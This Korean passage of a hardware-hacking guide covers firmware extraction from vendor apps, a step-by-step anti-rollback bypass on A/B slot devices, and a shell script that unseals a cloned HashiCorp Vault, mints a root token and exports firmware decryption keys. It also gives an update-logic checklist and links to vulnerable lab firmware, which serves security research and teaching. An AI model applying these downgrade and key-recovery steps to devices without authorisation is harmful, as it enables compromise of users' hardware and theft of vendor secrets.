많은 공급업체는 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있도록 전체 펌웨어 이미지를 함께 제공되는 모바일 애플리케이션에 포함합니다. 이러한 패키지는 일반적으로 `assets/fw/` 또는 `res/raw/`와 같은 경로에 있는 APK/APEX에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra` 또는 일반 `unzip` 같은 도구를 사용하면 물리적 하드웨어에 접근하지 않고도 서명된 이미지를 추출할 수 있습니다.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 설계에서 updater만 대상으로 하는 anti-rollback 우회

일부 vendor는 anti-downgrade **ratchet**을 구현하지만, *updater* 로직 내부에서만 구현합니다(예: CAN을 통한 UDS routine, recovery command 또는 userspace OTA agent). 이후 **bootloader**가 image signature/CRC만 확인하고 partition table 또는 slot metadata를 신뢰한다면, rollback protection은 여전히 우회될 수 있습니다.<sup>[[7]](#references)</sup>

일반적인 취약 설계:

- Firmware metadata에 version descriptor와 **security ratchet** / monotonic counter가 모두 포함됩니다.
- Updater는 image ratchet을 persistent storage에 저장된 값과 비교하고, 더 오래된 signed image를 거부합니다.
- Bootloader는 해당 ratchet을 파싱하지 않고, 부팅 전에 header, CRC, signature만 검증합니다.
- Slot 활성화 정보는 partition table 또는 slot별 generation counter에 별도로 저장되며, 검증된 firmware의 정확한 digest와 **암호학적으로 연결되지 않습니다**.

이로 인해 dual-slot 시스템에서 **한 image를 검증하고 다른 image를 부팅하는** primitive가 만들어집니다. 공격자가 현재 signed image를 사용해 updater가 slot B를 다음 부팅 대상으로 표시하게 한 뒤 재부팅 전에 slot B를 덮어쓸 수 있다면, bootloader는 이미 커밋된 slot metadata만 신뢰하므로 downgrade된 image를 부팅할 수 있습니다.

일반적인 악용 패턴:

1. **현재 signed** firmware를 비활성 slot에 업로드하고 일반적인 검증/전환 routine을 실행해 해당 slot을 다음 활성 slot으로 표시합니다.
2. **아직 재부팅하지 않습니다**. 같은 session에서 slot 준비/삭제 routine을 다시 실행합니다.
3. 오래된 boot-state 또는 slot 선택 로직을 악용해 updater가 방금 활성화된 **동일한 물리 slot**을 삭제하게 합니다.
4. 더 오래되었지만 여전히 signed된 firmware를 해당 slot에 씁니다.
5. ratchet을 적용하는 검증 routine을 건너뛰고 바로 재부팅합니다.
6. Bootloader는 활성화된 slot을 선택하고 signature/integrity만 검증한 뒤 이전 image를 부팅합니다.

A/B update 구현을 reverse할 때 살펴볼 항목:

- 성공적으로 전환한 뒤에도 갱신되지 않는 **부팅 시점 flag**에서 slot 선택을 도출하는지 여부.
- **현재 커밋된 layout**이 아니라 오래된 상태를 기준으로 slot을 삭제하는 `prepare_passive_slot()` 형태의 routine.
- 검증된 image hash를 저장하지 않고 **generation counter** / active flag만 변경하는 `part_write_layout()` 형태의 function.
- userspace 또는 updater 코드에 구현된 ratchet 검사지만 ROM / bootloader / secure boot 단계에는 없는 경우.
- 내용이 삭제되고 다시 기록된 뒤에도 slot을 부팅 가능 상태로 남겨 두는 삭제 또는 recovery routine.

### Update Logic 평가 체크리스트

* *Update endpoint*의 전송/인증이 충분히 보호되는가(TLS + 인증)?
* Flashing 전에 device가 **version number** 또는 **monotonic anti-rollback counter**를 비교하는가?
* Image가 secure boot chain 내부에서 검증되는가(예: ROM code가 signature를 검사)?
* **Bootloader가** signature/CRC만 확인하는 대신 updater와 동일한 ratchet을 적용하는가?
* Slot 활성화 metadata가 **검증된 firmware digest/version에 연결되어 있는가**, 아니면 활성화 후 slot을 수정할 수 있는가?
* Slot 전환이 성공한 뒤 device가 강제로 재부팅되는가, 아니면 같은 session에서 이후 update/삭제 routine을 계속 실행할 수 있는가?
* Userland code가 추가 sanity check(예: 허용된 partition map, model number)를 수행하는가?
* *부분* 또는 *백업* update flow가 동일한 검증 로직을 재사용하는가?

> 💡  위 항목 중 누락된 것이 있다면, 해당 platform은 rollback attack에 취약할 가능성이 높습니다.

## 실습용 취약 firmware

Firmware 취약점을 찾는 연습을 하려면 다음 취약 firmware 프로젝트를 시작점으로 사용하세요.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 내장 KMS/Vault 상태에서 firmware 복호화 키 복구하기

Update image에 작은 평문 metadata와 용량이 큰 고엔트로피 blob이 함께 들어 있다면, 무차별 대입을 시도하기 전에 컨테이너를 먼저 분석하세요.<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d`, `binwalk -E`를 사용해 header, offset, 줄 경계를 덤프합니다.
- `Salted__`는 보통 OpenSSL `enc` format을 의미합니다. 다음 8바이트는 salt이고 나머지는 ciphertext입니다.
- 디코딩 결과가 정확히 `256`바이트인 Base64 field는 무작위 firmware password/session key를 감싼 RSA-2048 ciphertext일 가능성이 높다는 단서입니다.
- 같은 파일에 있는 detached PGP 자료는 authenticity만 보호하는 경우가 많습니다. 이것이 confidentiality mechanism이라고 단정하지 마세요.

정적 키 검색(`grep`, `strings`, PEM/PGP 검색)에 실패하면 private key 검색에만 매달리지 말고 **실제 복호화 경로**를 reverse하세요.

- Updater / management binary를 decompile하고, 암호화된 blob을 읽는 주체, 이를 unwrap하는 helper/API, 요청하는 논리적 key name을 추적합니다.
- 추출한 root filesystem에서 KMS 상태(`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`)와 unit file 및 init script를 검색합니다.
- 평문 `vault operator unseal ...`, recovery key, bootstrap token 또는 로컬 KMS auto-unseal script는 private-key 자료와 동일하게 취급합니다.

Appliance에 원본 Vault binary와 storage backend가 포함되어 있다면 Vault 내부를 다시 구현하는 것보다 해당 환경을 재현하는 편이 대체로 쉽습니다.

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

With root on the cloned KMS:

- 복제된 환경 안에서만 transit 키를 내보낼 수 있도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap 키를 내보냅니다: `vault read transit/export/encryption-key/<name>`
- 복구한 RSA 키를 KMS에서 사용한 정확한 padding/hash 조합으로 시도합니다. PKCS#1 v1.5 복호화와 기본 OAEP 복호화가 모두 실패하더라도 키가 잘못되었다고 단정할 수는 없습니다. Vault 기반 흐름에서는 OAEP와 SHA-256을 사용하는 경우가 많지만, 일반적인 라이브러리의 기본값은 SHA-1입니다.
- payload가 `Salted__`로 시작한다면, AES-CBC 복호화를 시도하기 전에 vendor의 OpenSSL KDF(`EVP_BytesToKey`, 레거시 appliance에서는 MD5인 경우가 많음)를 정확히 재현합니다.

이렇게 하면 "암호화된 firmware" 문제는 더 일반적인 문제로 바뀝니다. **appliance 측 operational key를 복구한 다음, 정확한 unwrap 및 KDF 매개변수로 오프라인에서 재현합니다.**

## 교육 및 자격증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude를 활용한 firmware 크래킹: 시니어급 기술, 주니어급 자율성](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware 보안 테스트 방법론](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [실전 IoT hacking: 사물 인터넷 공격을 위한 완벽 가이드](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [방치된 hardware의 zero-day 취약점 악용 – Trail of Bits 블로그](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 스마트 기기로 다른 사람의 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [이제 mi가 보이네요: 이제 해킹당했네요](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 커넥터를 통한 Tesla Wall Connector 악용 - 2부: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [깜빡이게 만들기: Philips Hue Bridge의 무선 업데이트를 통한 악용](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU에서 Tesla OS root 권한 얻기 2부: 디버깅 및 수정](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
